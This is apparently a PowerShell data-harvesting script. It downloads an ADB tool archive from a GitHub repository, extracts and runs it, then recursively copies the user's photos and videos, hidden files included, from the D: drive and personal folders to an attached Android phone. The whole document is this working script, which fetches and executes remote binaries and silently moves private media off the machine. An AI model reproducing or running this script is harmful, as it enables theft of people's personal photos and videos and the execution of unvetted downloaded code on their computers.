$scriptPath = $MyInvocation.MyCommand.Path
$scriptDirectory = Split-Path $scriptPath

$adbZipUrl = "https://github.com/d4rks1d33/ADB-Tools/raw/main/ADB.zip"

$adbZipPath = Join-Path $env:TEMP "ADB.zip"

Invoke-WebRequest -Uri $adbZipUrl -OutFile $adbZipPath

Expand-Archive -Path $adbZipPath -DestinationPath $env:TEMP -Force

$adbExecutable = Join-Path $env:TEMP "adb.exe"

$androidDestinationPath = "/storage/emulated/0/Documents"

$user = $env:USERNAME

Get-ChildItem -Path "D:\", "C:\Users\$user\Pictures", "C:\Users\$user\Documents", "C:\Users\$user\Videos", "C:\Users\$user\Downloads" -Recurse -File -Force |
    Where-Object { $_.Extension -match '\.(jpg|jpeg|jfif|webp|MOV|mp4)$' -and $_.Length -le 300MB } |
    ForEach-Object {
        & $adbExecutable push "$($_.FullName)" "$androidDestinationPath"
    }
